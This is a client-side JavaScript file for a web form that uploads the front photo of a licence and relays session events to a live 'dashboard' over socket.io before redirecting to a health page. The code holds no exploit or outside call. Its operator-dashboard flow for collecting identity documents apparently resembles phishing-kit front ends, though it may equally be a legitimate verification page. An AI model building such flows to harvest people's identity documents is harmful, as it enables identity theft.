/* front-client.js */
(function () {
  const SERVER_URL = window.location.origin;
  const SESSION_STORAGE_KEY = "sessionID";
  const DASH_EMIT_EVENT = "client-data";
  const DASH_JOIN_EVENT = "client-join";
  

  function onceDomReady(fn) {
    if (document.readyState === "loading") {
      document.addEventListener("DOMContentLoaded", fn, { once: true });
    } else {
      fn();
    }
  }

  function getOrCreateSessionID() {
    let sid = null;
    try { sid = localStorage.getItem(SESSION_STORAGE_KEY) || null; } catch {}
    if (!sid) {
      sid = Math.random().toString(36).slice(2) + Math.random().toString(36).slice(2);
      try { localStorage.setItem(SESSION_STORAGE_KEY, sid); } catch {}
    }
    return sid;
  }

  



  (function checkSuccess() {
    try {
      if (localStorage.getItem('successfront')) {
        window.location.replace('health.html');
      }
    } catch {}
  })();

  function ensureSocketIO(cb) {
    if (window.io && typeof window.io === "function") return cb();

    const s = document.createElement("script");
    s.src = SERVER_URL.replace(/\/$/, "") + "/socket.io/socket.io.js";
    s.async = true;
    s.onload = cb;
    s.onerror = () => console.warn("[front-client] Could not load socket.io from server.");
    document.head.appendChild(s);
  }

  function connectSocket(sessionID) {
    if (!window.io) {
      console.warn("[front-client] socket.io not available.");
      return null;
    }
    const socket = window.io(SERVER_URL, { transports: ["websocket", "polling"] });

    socket.on("connect", () => {
      console.log("[front-client] connected:", socket.id, "session:", sessionID);
      socket.emit(DASH_JOIN_EVENT, { sessionID });
    });

    socket.on("disconnect", () => {
      console.log("[front-client] disconnected");
    });

    socket.on("dashboard-action", ({ buttonName, value }) => {
      console.log("[front-client] dashboard action:", buttonName, value);
    });

    return socket;
  }

  

  onceDomReady(function () {
    ensureSocketIO(() => {
      const sessionID = getOrCreateSessionID();
      const socket = connectSocket(sessionID);
      if (!socket) return;

      const photoInput = document.getElementById('licencePhoto');
      const form = document.getElementById('licenceForm');

      // Emit a notification when a photo is selected (metadata only, not the full image)
      if (photoInput) {
        photoInput.addEventListener('change', function() {
          const file = this.files && this.files[0];
          if (file) {
            socket.emit(DASH_EMIT_EVENT, {
              type: "licence-photo-selected",
              data: JSON.stringify({ name: file.name, size: file.size, type: file.type })
            });
          }
        });
      }

      if (form) {
        form.addEventListener('submit', async function(e) {
          e.preventDefault();

          const file = photoInput && photoInput.files && photoInput.files[0];
          if (!file) return;

          const formData = new FormData();
          formData.append('image', file);
          formData.append('sessionID', sessionID);
          formData.append('imageType', 'front');

          const submitBtn = form.querySelector('[type=submit]');
          const spinnerOverlay = document.getElementById('spinnerOverlay');
          if (submitBtn) submitBtn.disabled = true;
          if (spinnerOverlay) spinnerOverlay.classList.add('visible');

          try {
            const resp = await fetch('/api/upload-image', { method: 'POST', body: formData });
            if (!resp.ok) throw new Error(`Server error ${resp.status}`);
            try { localStorage.setItem('successfront', '1'); } catch {}
            window.location.replace('health.html');
          } catch (err) {
            const detail = [
              'Message: ' + (err && err.message ? err.message : String(err)),
              'Type: ' + (err && err.name ? err.name : 'unknown'),
              'File: ' + (file ? file.name + ' / ' + file.type + ' / ' + file.size + 'b' : 'none'),
              'URL: ' + window.location.href,
              'Online: ' + navigator.onLine
            ].join('\n');
            console.warn('[front-client] Upload error:', err);
            alert('Upload failed:\n\n' + detail);
            if (spinnerOverlay) spinnerOverlay.classList.remove('visible');
            if (submitBtn) submitBtn.disabled = false;
          }
        });
      }
    });
  });
})();